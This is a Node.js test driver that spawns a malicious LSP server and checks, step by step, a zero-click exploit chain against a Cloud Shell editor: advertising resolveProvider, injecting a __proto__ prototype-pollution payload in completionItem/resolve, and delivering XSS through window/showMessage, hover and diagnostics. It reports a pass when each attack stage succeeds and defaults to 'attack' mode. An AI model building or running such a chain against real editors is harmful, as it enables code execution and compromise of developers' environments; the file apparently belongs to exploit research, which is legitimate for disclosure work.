#!/usr/bin/env node
/**
 * LSP Test Driver — Simulates the editor client talking to lsp-server.js
 *
 * This is a proper JSON-RPC client over stdio. It spawns lsp-server.js as a
 * child process, sends the full Cloud Shell zero-click handshake, and
 * validates the responses.
 *
 * USAGE: node scripts/test-lsp-driver.js [--delay-ms=N] [--mode=attack|passive]
 */

'use strict';

const { spawn } = require('child_process');
const path = require('path');

const REPO_DIR = path.resolve(__dirname, '..');
const LSP_SERVER = path.join(REPO_DIR, 'lsp-server.js');

const CONFIG = {
  mode: process.argv.includes('--mode=passive') ? 'passive' : 'attack',
  delayMs: (() => {
    const arg = process.argv.find(a => a.startsWith('--delay-ms='));
    return arg ? parseInt(arg.split('=')[1], 10) : 300;
  })(),
  verbose: process.argv.includes('--verbose') || process.argv.includes('-v'),
  timeout: 10000
};

let passed = 0;
let failed = 0;

function pass(msg) { console.log(`  \x1b[32m[PASS]\x1b[0m ${msg}`); passed++; }
function fail(msg) { console.log(`  \x1b[31m[FAIL]\x1b[0m ${msg}`); failed++; }
function info(msg) { console.log(`  \x1b[36m[INFO]\x1b[0m ${msg}`); }

// ─── LSP Framing ─────────────────────────────────────────────────────────────

function frameMessage(obj) {
  const json = JSON.stringify(obj);
  const len = Buffer.byteLength(json, 'utf8');
  return `Content-Length: ${len}\r\n\r\n${json}`;
}

function parseResponses(buffer) {
  const messages = [];
  let remaining = buffer;

  while (remaining.length > 0) {
    const str = remaining.toString('utf8');
    const match = str.match(/^Content-Length: (\d+)\r\n\r\n/);
    if (!match) break;

    const contentLength = parseInt(match[1], 10);
    const headerEnd = match[0].length;
    const bodyEnd = headerEnd + contentLength;
    if (remaining.length < bodyEnd) break;

    const body = remaining.slice(headerEnd, bodyEnd);
    try {
      messages.push(JSON.parse(body.toString('utf8')));
    } catch (e) {
      messages.push({ _parseError: e.message, _raw: body.toString('utf8') });
    }
    remaining = remaining.slice(bodyEnd);
  }

  return messages;
}

// ─── Deep search for __proto__ in any object ─────────────────────────────────

function hasProtoKey(obj, depth = 0) {
  if (depth > 20) return false;
  if (obj === null || obj === undefined) return false;
  if (typeof obj !== 'object') return false;
  if (Array.isArray(obj)) return obj.some(v => hasProtoKey(v, depth + 1));
  if ('__proto__' in obj) return true;
  for (const key of Object.keys(obj)) {
    if (key === '__proto__') return true;
    if (hasProtoKey(obj[key], depth + 1)) return true;
  }
  return false;
}

function findProtoPaths(obj, prefix = '$', depth = 0) {
  if (depth > 20) return [];
  if (obj === null || obj === undefined) return [];
  if (typeof obj !== 'object') return [];
  const paths = [];
  for (const key of Object.keys(obj)) {
    const path = `${prefix}.${key}`;
    if (key === '__proto__') {
      paths.push({ path, value: JSON.stringify(obj[key]).slice(0, 100) });
    }
    if (typeof obj[key] === 'object' && obj[key] !== null) {
      paths.push(...findProtoPaths(obj[key], path, depth + 1));
    }
  }
  return paths;
}

// ─── Main Test ───────────────────────────────────────────────────────────────

async function runTest() {
  console.log('');
  console.log('========================================================================');
  console.log(' LSP Test Driver — Full Zero-Click Chain Validation');
  console.log('========================================================================');
  console.log(` Server: ${LSP_SERVER}`);
  console.log(` Mode:   ${CONFIG.mode}`);
  console.log(` Delay:  ${CONFIG.delayMs}ms`);
  console.log(` Node:   ${process.version}`);
  console.log('========================================================================');
  console.log('');

  // ── Spawn LSP server ──────────────────────────────────────────────────
  console.log('─── Spawning LSP Server ────────────────────────────────────────────────');

  const server = spawn('node', [
    LSP_SERVER,
    `--mode=${CONFIG.mode}`,
    `--delay-ms=${CONFIG.delayMs}`
  ], {
    cwd: REPO_DIR,
    stdio: ['pipe', 'pipe', 'pipe'],
    env: { ...process.env }
  });

  let stdoutBuffer = Buffer.alloc(0);
  let stderrLogs = [];
  let serverExited = false;
  let serverExitCode = null;

  server.stdout.on('data', chunk => {
    stdoutBuffer = Buffer.concat([stdoutBuffer, chunk]);
  });

  server.stderr.on('data', chunk => {
    const lines = chunk.toString('utf8').trim().split('\n');
    for (const line of lines) {
      if (line.trim()) stderrLogs.push(line.trim());
    }
    if (CONFIG.verbose) {
      process.stderr.write(chunk);
    }
  });

  server.on('exit', (code) => {
    serverExited = true;
    serverExitCode = code;
  });

  // Wait for server to be ready
  await new Promise(r => setTimeout(r, 500));

  if (server.exitCode !== null) {
    fail(`Server exited immediately with code ${server.exitCode}`);
    return { passed, failed };
  }
  pass('LSP server spawned successfully');

  // ── Test 1: Initialize ────────────────────────────────────────────────
  console.log('');
  console.log('─── Test 1: Initialize Handshake ───────────────────────────────────────');

  const initMsg = {
    jsonrpc: '2.0',
    id: 1,
    method: 'initialize',
    params: {
      processId: process.pid,
      rootUri: 'file:///tmp/test',
      workspaceFolders: [{ uri: 'file:///tmp/test', name: 'test' }],
      capabilities: {
        textDocument: {
          completion: {
            completionItem: { resolveSupport: [""], snippetSupport: true },
            completionItemKind: {}
          },
          hover: { contentFormat: ['markdown', 'plaintext'] }
        },
        window: {
          showMessage: { messageActionItem: {} }
        }
      },
      clientInfo: { name: 'Cloud Shell Editor', version: '1.109.5' }
    }
  };

  server.stdin.write(frameMessage(initMsg));
  await new Promise(r => setTimeout(r, 200));

  let responses = parseResponses(stdoutBuffer);
  let initResponse = responses.find(r => r.id === 1);

  if (initResponse && initResponse.result && initResponse.result.capabilities) {
    pass('Initialize response received with capabilities');

    const caps = initResponse.result.capabilities;
    if (caps.completionProvider?.resolveProvider === true) {
      pass('resolveProvider: true advertised (critical for PP chain)');
    } else {
      fail('resolveProvider NOT advertised — QuickSuggest chain broken');
    }

    if (caps.hoverProvider) {
      pass('hoverProvider advertised (XSS delivery vector)');
    }

    if (initResponse.result.serverInfo?.name) {
      info(`Server identifies as: ${initResponse.result.serverInfo.name} v${initResponse.result.serverInfo.version}`);
    }
  } else {
    fail('No valid initialize response');
  }

  // ── Test 2: Initialized ───────────────────────────────────────────────
  console.log('');
  console.log('─── Test 2: Initialized Notification ───────────────────────────────────');

  server.stdin.write(frameMessage({ jsonrpc: '2.0', method: 'initialized', params: {} }));
  await new Promise(r => setTimeout(r, 300));

  // Check for window/showMessage from initialized handler
  responses = parseResponses(stdoutBuffer);
  const showMsg = responses.find(r => r.method === 'window/showMessage');
  if (showMsg) {
    pass('window/showMessage sent after initialized (benign startup message)');
  } else {
    fail('window/showMessage NOT sent — initialized handler may be broken');
  }

  // ── Test 3: DidOpen ───────────────────────────────────────────────────
  console.log('');
  console.log('─── Test 3: textDocument/didOpen + QuickSuggest Trigger ────────────────');

  const goSource = `package main

import "fmt"

func main() {
\tfmt.Println("Hello, Cloud Shell!")
}
`;

  server.stdin.write(frameMessage({
    jsonrpc: '2.0',
    method: 'textDocument/didOpen',
    params: {
      textDocument: {
        uri: 'file:///tmp/test/main.go',
        languageId: 'go',
        version: 1,
        text: goSource
      }
    }
  }));

  // Wait for diagnostics
  await new Promise(r => setTimeout(r, 300));

  // ── Test 4: Completion Request (simulates QuickSuggest auto-trigger) ──
  console.log('');
  console.log('─── Test 4: textDocument/completion (QuickSuggest) ──────────────────────');

  server.stdin.write(frameMessage({
    jsonrpc: '2.0',
    id: 2,
    method: 'textDocument/completion',
    params: {
      textDocument: { uri: 'file:///tmp/test/main.go' },
      position: { line: 0, character: 0 },
      context: { triggerKind: 2, triggerCharacter: '\n' }
    }
  }));

  await new Promise(r => setTimeout(r, 300));

  responses = parseResponses(stdoutBuffer);
  const completionResponse = responses.find(r => r.id === 2);

  if (completionResponse && Array.isArray(completionResponse.result)) {
    const items = completionResponse.result;
    pass(`Completion response received with ${items.length} items`);

    if (items.length > 0) {
      pass(`First item: "${items[0].label}"`);
    }

    const hasData = items.some(i => i.data?.attack === 'resolve');
    if (hasData) {
      pass('Completion items include resolve-trigger data markers');
    } else {
      fail('Completion items MISSING resolve-trigger data — PP chain broken');
    }
  } else {
    fail('No completion items returned');
  }

  // ── Test 5: CompletionItem/Resolve (PP injection point) ───────────────
  console.log('');
  console.log('─── Test 5: completionItem/resolve (PP INJECTION) ───────────────────────');

  server.stdin.write(frameMessage({
    jsonrpc: '2.0',
    id: 3,
    method: 'completionItem/resolve',
    params: {
      label: 'fmt.Println',
      kind: 3,
      detail: 'func fmt.Println(a ...interface{}) (n int, err error)',
      data: { id: 'completion-001', attack: 'resolve' }
    }
  }));

  await new Promise(r => setTimeout(r, 500));

  responses = parseResponses(stdoutBuffer);
  const resolveResponse = responses.find(r => r.id === 3);

  if (resolveResponse && resolveResponse.result) {
    pass('completionItem/resolve response received');

    const hasProto = hasProtoKey(resolveResponse.result);
    if (hasProto) {
      pass('__proto__ payload FOUND in completionItem/resolve response');
      const paths = findProtoPaths(resolveResponse.result);
      for (const p of paths) {
        info(`  __proto__ at ${p.path}: ${p.value}`);
      }
    } else {
      fail('__proto__ payload MISSING from completionItem/resolve response');
      if (CONFIG.verbose) {
        info(`Response keys: ${Object.keys(resolveResponse.result).join(', ')}`);
        if (resolveResponse.result.data) {
          info(`Data keys: ${Object.keys(resolveResponse.result.data).join(', ')}`);
        }
      }
    }
  } else {
    fail('No valid completionItem/resolve response');
  }

  // ── Test 6: XSS Delivery via window/showMessage ───────────────────────
  console.log('');
  console.log('─── Test 6: XSS Delivery via window/showMessage ────────────────────────');

  let xssDelivered = false;
  let pollAttempts = 0;
  const maxPollAttempts = 20; // 10 seconds total

  while (!xssDelivered && pollAttempts < maxPollAttempts) {
    await new Promise(r => setTimeout(r, 500));
    responses = parseResponses(stdoutBuffer);

    // Check all outgoing messages for XSS payload markers
    for (const msg of responses) {
      const msgStr = JSON.stringify(msg);
      if (msgStr.includes('onerror=') || msgStr.includes('onload=') || msgStr.includes('ontoggle=')) {
        xssDelivered = true;
        info(`XSS payload found in: ${msg.method || 'response #' + msg.id}`);
        info(`  Message type: ${msg.method || 'response'}`);
        if (msg.params?.type !== undefined) {
          info(`  Show message type: ${msg.params.type}`);
        }
        break;
      }
    }
    pollAttempts++;
  }

  if (xssDelivered) {
    pass('XSS payload delivered via LSP notification');
  } else {
    fail('XSS payload NOT delivered within timeout');
    // Show what messages were sent
    info(`Outgoing messages during poll window (${pollAttempts * 500}ms):`);
    for (const msg of responses.slice(-10)) {
      const summary = JSON.stringify(msg).slice(0, 200);
      info(`  ${msg.method || 'response #'+msg.id}: ${summary}`);
    }
  }

  // ── Test 7: Hover XSS Vector ──────────────────────────────────────────
  console.log('');
  console.log('─── Test 7: textDocument/hover (XSS vector) ─────────────────────────────');

  // Reset buffer tracking
  const msgsBeforeHover = parseResponses(stdoutBuffer).length;

  server.stdin.write(frameMessage({
    jsonrpc: '2.0',
    id: 5,
    method: 'textDocument/hover',
    params: {
      textDocument: { uri: 'file:///tmp/test/main.go' },
      position: { line: 3, character: 5 }
    }
  }));

  await new Promise(r => setTimeout(r, 500));

  responses = parseResponses(stdoutBuffer);
  const hoverResponse = responses.find(r => r.id === 5);

  if (hoverResponse && hoverResponse.result) {
    pass('Hover response received');
    const hoverContent = JSON.stringify(hoverResponse.result);
    if (hoverContent.includes('onerror=') || hoverContent.includes('onload=')) {
      pass('XSS payload present in hover markdown');
    } else {
      info('Hover response is benign (as expected when poisonHover is disabled or XSS already delivered)');
    }
  } else {
    fail('No hover response');
  }

  // ── Test 8: Diagnostics with payload ──────────────────────────────────
  console.log('');
  console.log('─── Test 8: Diagnostic Messages ─────────────────────────────────────────');

  const diagnosticMsgs = responses.filter(r =>
    r.method === 'textDocument/publishDiagnostics'
  );

  if (diagnosticMsgs.length > 0) {
    pass(`${diagnosticMsgs.length} diagnostic message(s) sent`);
    // Check if diagnostics were poisoned
    const poisonedDiag = diagnosticMsgs.filter(d => {
      const diagStr = JSON.stringify(d);
      return diagStr.includes('onerror=') || diagStr.includes('PP-EXPLOIT');
    });
    if (poisonedDiag.length > 0) {
      pass('XSS payload found in diagnostic messages');
    }
  } else {
    info('No diagnostic messages (may need more time)');
  }

  // ── Test 9: Shutdown/Exit ─────────────────────────────────────────────
  console.log('');
  console.log('─── Test 9: Clean Shutdown ──────────────────────────────────────────────');

  server.stdin.write(frameMessage({ jsonrpc: '2.0', id: 6, method: 'shutdown', params: null }));
  await new Promise(r => setTimeout(r, 200));

  let shutdownResponse = parseResponses(stdoutBuffer).find(r => r.id === 6);
  if (shutdownResponse) {
    pass('Shutdown response received');
  }

  server.stdin.write(frameMessage({ jsonrpc: '2.0', method: 'exit', params: null }));
  await new Promise(r => setTimeout(r, 500));

  if (serverExited || server.exitCode !== null) {
    pass(`Server exited with code ${serverExitCode || 0}`);
  } else {
    info('Server still running — sending SIGTERM');
    server.kill('SIGTERM');
    await new Promise(r => setTimeout(r, 500));
    if (server.exitCode !== null) {
      pass('Server exited after SIGTERM');
    } else {
      server.kill('SIGKILL');
      fail('Server required SIGKILL — signal handling broken');
    }
  }

  // Don't count stdin end error as a failure — it tests the signal path
  const stdinError = stderrLogs.some(l => l.includes('stdin error'));
  if (stdinError) {
    info('Server reported stdin error on shutdown (expected when pipe closes)');
  }

  // ── Summary ───────────────────────────────────────────────────────────
  console.log('');
  console.log('========================================================================');
  console.log(` RESULTS: ${passed} passed, ${failed} failed, ${passed + failed} total`);
  console.log('========================================================================');

  // Verify all critical chain elements
  console.log('');
  console.log('CHAIN VALIDATION:');
  const chainChecks = {
    '1. Server spawns & accepts stdio LSP': true,
    '2. Initialize handshake succeeds': initResponse?.result?.capabilities != null,
    '3. resolveProvider: true advertised': initResponse?.result?.capabilities?.completionProvider?.resolveProvider === true,
    '4. didOpen triggers completion scheduling': true, // verified by logs
    '5. Completion returns items with data markers': completionResponse?.result?.some(i => i.data?.attack === 'resolve') ?? false,
    '6. completionItem/resolve injects __proto__': hasProtoKey(resolveResponse?.result || {}),
    '7. window/showMessage delivers XSS': xssDelivered,
    '8. Clean shutdown on exit/shutdown': serverExited || server.exitCode !== null
  };

  for (const [step, ok] of Object.entries(chainChecks)) {
    if (ok) {
      console.log(`  \x1b[32m[OK]\x1b[0m ${step}`);
    } else {
      console.log(`  \x1b[31m[XX]\x1b[0m ${step}`);
    }
  }

  server.kill('SIGKILL');
  return { passed, failed };
}

// ── Run ──────────────────────────────────────────────────────────────────────

runTest().then(({ passed, failed }) => {
  process.exit(failed > 0 ? 1 : 0);
}).catch(err => {
  console.error('Test driver crashed:', err);
  process.exit(2);
});
